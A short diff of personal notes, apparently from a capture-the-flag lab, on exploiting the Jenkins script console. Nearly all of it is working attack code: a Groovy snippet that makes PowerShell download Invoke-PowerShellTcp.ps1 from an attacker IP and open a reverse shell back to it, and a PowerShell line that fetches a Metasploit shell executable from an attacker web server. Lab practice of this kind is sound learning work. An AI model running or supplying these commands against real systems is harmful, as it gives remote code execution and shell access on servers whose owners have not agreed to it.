@@ -1,0 +1,14 @@
+So, for the jenkins exploit, I ran the following to get a reverse shell inside of the script console inside of the jenkins HTTP server management console.
+
+def command = 'powershell -c "iex (New-Object Net.WebClient).DownloadString(\'http://10.11.116.65:1234/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.116.65 -Port 1235"'
+def proc = command.execute()
+proc.waitFor()
+println proc.text
+
+this is some sort of "groovyscript" which is kinda useful for whats going on rn
+
+
+another thing you could download is a msfshell which is like the following command:
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
+
+
